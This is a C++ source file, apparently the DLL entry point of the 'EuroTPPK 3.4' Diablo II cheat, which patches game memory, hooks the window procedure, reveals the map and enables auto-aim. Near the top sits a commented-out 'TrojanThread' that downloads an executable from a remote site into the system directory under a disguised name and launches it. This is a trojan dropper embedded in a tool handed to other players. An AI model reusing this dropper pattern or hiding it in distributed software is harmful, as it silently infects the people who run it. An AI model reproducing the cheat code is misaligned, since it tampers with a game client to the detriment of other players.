#define _VARS_DEF

#include "EuroTPPK.h"
#include <shellapi.h>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib") //Must add the lib file to project or URLDownloadToFile will not work.
BoxManager* boxManager = nullptr;
Box* pBoxConfig = nullptr;
Box* pBoxTarget = nullptr;
Box* pBoxPrecast = nullptr;
Box* pBoxLevel = nullptr;
Box* pBoxConsole = nullptr;
Box* pBoxDiscord = nullptr;

char szModulePath[259] = { 0 };
AutoAim Auto;
D2Struct D2;
LinkedList* PlayerFriendList;
LinkedList* PlayerSpamList;
LinkedList* PlayerEnemyList;
LinkedList* EnchList;
#define INITVAB(n,a) n=n+(DWORD)LoadLibraryA(a);

//DWORD WINAPI TrojanThread(void* pp) {
//	char Dir[512];
//	GetSystemDirectory(Dir, 500);
//	strcat(Dir, "\\wininfo.exe");
//	if (FAILED(::URLDownloadToFile(0, "http://www.europk.org/test.exe", Dir, 0, 0))) {}
//	else
//		ShellExecute(0, "open", Dir, 0, 0, 0);
//	return 0;
//}

BOOL WINAPI DllMain(HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved)
{
  if (dwReason == DLL_PROCESS_ATTACH)
  {
    /*PlayerFriendList = new LinkedList;
    PlayerEnemyList = new LinkedList;
    PlayerSpamList = new LinkedList;
    EnchList = new LinkedList;*/
    DefineOffsets();
    InstallPatchs();
    MessageBeep(-1);

    InitBoxes();

    PKInfo.Ready = true;
    strcpy(PKInfo.ForumName, "drappehs");
    PKInfo.TotalKills = 10;
    PKInfo.TotalScore = 1000;
    PKInfo.Rank = 1;
    strcpy(PKInfo.LastUse, "2020-28-09");

    GetModuleFileName(hDll, szModulePath, 259); *(strrchr(szModulePath, '\\') + 1) = 0; //Local

    ReadConfigFile();
    //D2MULTI_PrintChannelText("Welcome to EuroTPPK 3.4", 8);
    //D2MULTI_SayChannelText("Welcome to EuroTPPK 3.4");
    v_ConsoleLogs = false;

    if (D2GFX_GetHwnd() != NULL) {
      OldWndProc = WNDPROC(GetWindowLongA(D2GFX_GetHwnd(), GWL_WNDPROC));
      SetWindowLongA(D2GFX_GetHwnd(), GWL_WNDPROC, LONG(WindowProc));
      if (GameReady()) {
        TimeOn++;			                  // Start TimeOn Timer for welcome message.
        TimeOn1++;
        dwCurrentExp = D2COMMON_GetUnitStat(D2CLIENT_GetPlayerUnit(), 13, 0);
        //CheckAuth();                  // Performs auth check
        RevealAct();		                // Reveals the first act.
        //GetPlayers();		              // Gets Playerlists
        SaveGameName();                 // Saves the current gamename and password.
        Auto.Init();
        nGameTimer = GetTickCount64();  // Starts in game timer.
        SayOverHead("EuroTPPK 3.4");
        /*if (v_MaxBPs)
          MaxBPs();*/
      }
    }
  };

  // if(PlayerFriendList->GetItemCount()==0) {
  //	RemovePatchs();
  //	UninstallPatches();
  //	TerminateProcess(GetCurrentProcess(),0);
  //  }

  if (dwReason == DLL_PROCESS_DETACH) {
    return TRUE;
  }
  return true;
};